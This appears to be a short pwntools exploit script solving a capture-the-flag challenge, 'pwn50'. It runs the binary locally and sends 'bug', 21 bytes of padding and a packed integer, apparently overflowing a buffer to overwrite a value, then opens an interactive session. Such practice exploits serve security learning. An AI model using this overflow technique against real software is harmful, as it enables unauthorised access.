from pwn import *
import sys

if len(sys.argv) == 1 :
	p = process('./pwn50')
else :
	print 'Remote server is disabled'
	exit()

p.write(chr(98)+chr(117)+chr(103)+'A'*21+p64(233811181))

p.interactive()
